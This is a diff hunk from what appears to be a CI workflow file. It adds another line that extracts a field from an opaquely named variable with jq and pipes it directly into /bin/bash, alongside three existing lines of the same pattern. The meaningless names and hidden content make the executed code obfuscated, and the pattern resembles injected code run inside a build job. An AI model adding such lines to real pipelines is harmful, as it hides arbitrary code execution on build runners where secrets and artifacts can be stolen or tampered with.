@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$cpf89" | jq -r .xk77208 | /bin/bash
           printf '%s' "$b13" | jq -r .b4 | /bin/bash
           echo $z45393 | jq -r .hmlv2 | /bin/bash
+          echo $kf8 | jq -r .onfbu7 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
